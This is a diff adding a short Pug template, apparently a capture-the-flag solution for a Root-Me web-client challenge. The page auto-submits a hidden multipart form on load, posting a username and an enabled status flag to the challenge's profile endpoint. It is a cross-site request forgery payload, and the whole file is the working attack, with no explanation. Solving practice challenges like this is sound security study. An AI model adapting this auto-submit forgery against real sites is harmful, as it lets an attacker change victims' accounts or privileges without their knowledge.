@@ -1,0 +1,12 @@
+html
+    body(onload='document.forms[0].submit()')
+        form(action='http://challenge01.root-me.org/web-client/ch22/?action=profile', method='post', enctype='multipart/form-data')
+            .form-group
+                label Username:
+                input(type='text', name='username', value='phat')
+            br
+            .form-group
+                label Status:
+                input(type='checkbox', name='status', checked='', value='on')
+            br
+            button(type='submit') Submit
